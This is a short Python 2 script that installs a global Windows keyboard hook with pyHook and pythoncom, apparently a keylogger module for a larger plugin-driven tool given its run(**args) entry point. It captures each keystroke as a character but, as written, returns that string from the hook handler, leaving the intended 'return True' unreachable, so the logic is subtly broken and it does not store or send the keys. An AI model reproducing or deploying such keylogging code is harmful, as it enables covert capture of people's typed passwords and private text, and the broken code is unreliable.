import pyHook, pythoncom, sys

def run(**args):
  try:
    def OnKeyboardEvent(event):
        action = chr(event.Ascii)
        return str(action)#chr(event.Ascii)
        return True
    hooks_manager = pyHook.HookManager ( )
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard ( )
    pythoncom.PumpMessages ()
  except Exception, e:
      return str(e)
  
  
